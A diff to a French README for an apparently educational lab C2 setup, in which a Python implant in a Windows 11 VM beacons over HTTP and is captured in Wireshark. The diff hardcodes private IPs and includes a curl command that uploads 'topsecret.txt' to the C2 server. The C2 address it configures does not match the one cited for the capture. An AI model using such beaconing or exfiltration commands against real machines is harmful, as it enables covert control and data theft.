@@ -22,7 +22,7 @@ leurs en-têtes et leur contenu.
 
 ## 2. Architecture
 
-- **Serveur C2 :** machine hôte, à l'adresse `<IP_HOTE>`.
+- **Serveur C2 :** machine hôte, à l'adresse `10.84.107.141`.
 - **Implant :** machine virtuelle Windows 11 sous VirtualBox.
 - **Protocole applicatif :** HTTP.
 - **Port d'écoute :** `8000`.
@@ -31,7 +31,8 @@ leurs en-têtes et leur contenu.
 - **Capture réseau :** Wireshark.
 
 Le serveur écoute sur `0.0.0.0:8000`, ce qui lui permet de recevoir des
-connexions sur ses interfaces réseau. L'implant utilise l'URL fournie par la variable d'environnement `C2_URL`.
+connexions sur ses interfaces réseau. L'implant utilise l'URL configurée dans
+`client/implant.py`.
 
 ## 3. Technologies utilisées
 
@@ -61,10 +62,10 @@ Au démarrage, l'implant :
 2. affiche son identifiant et l'URL du C2 ;
 3. initialise le résultat précédent à une chaîne vide.
 
-Les principaux paramètres sont définis dans `client/implant.py`. L'URL du C2
-est fournie au lancement via la variable d'environnement `C2_URL` :
+L'URL et les principaux paramètres sont définis dans `client/implant.py` :
 
 ```python
+C2_URL = "http://10.84.107.141:8000"
 BEACON_INTERVAL = 5
 REQUEST_TIMEOUT = 5
 ```
@@ -151,7 +152,7 @@ Le nom est réduit à son nom de fichier avec `os.path.basename`, puis le conten
 est écrit dans le répertoire courant du serveur. Par exemple :
 
 ```powershell
-curl.exe -X POST "http://<IP_HOTE>:8000/" `
+curl.exe -X POST "http://10.84.107.141:8000/" `
   -H "Content-Type: application/octet-stream" `
   -H "X-Filename: topsecret.txt" `
   --data-binary "@topsecret.txt"
@@ -164,8 +165,8 @@ n'effectue pas automatiquement d'upload de fichier.
 
 ### Côté serveur
 
-Sur la machine hôte, vérifier que l'adresse utilisée par la VM est accessible,
-puis lancer :
+Sur la machine hôte, vérifier que l'adresse configurée dans l'implant correspond
+bien à l'adresse IP accessible depuis la VM, puis lancer :
 
 ```powershell
 python .\server\c2.py
@@ -184,10 +185,10 @@ depuis le réseau utilisé par la VM.
 
 ### Côté machine virtuelle
 
-Copier `client\implant.py` dans la VM Windows 11, définir `C2_URL`, puis lancer :
+Copier `client\implant.py` dans la VM Windows 11 et vérifier la valeur de
+`C2_URL`. Depuis la VM, lancer :
 
 ```powershell
-$env:C2_URL = "http://<IP_HOTE>:8000"
 python .\implant.py
 ```
 
@@ -227,7 +228,7 @@ HTTP Stream**.
 ### Captures réalisées
 
 La première capture montre les échanges réguliers entre l'implant
-(`<IP_VM>`) et le serveur C2 (`<IP_HOTE>`) sur le port `8000`. Les
+(`10.0.2.15`) et le serveur C2 (`192.168.1.92`) sur le port `8000`. Les
 requêtes `POST` et les réponses `HTTP/1.0 200 OK` apparaissent
 successivement dans Wireshark. La capture montre également une requête binaire
 avec l'en-tête `X-Filename: topsecret.txt`.
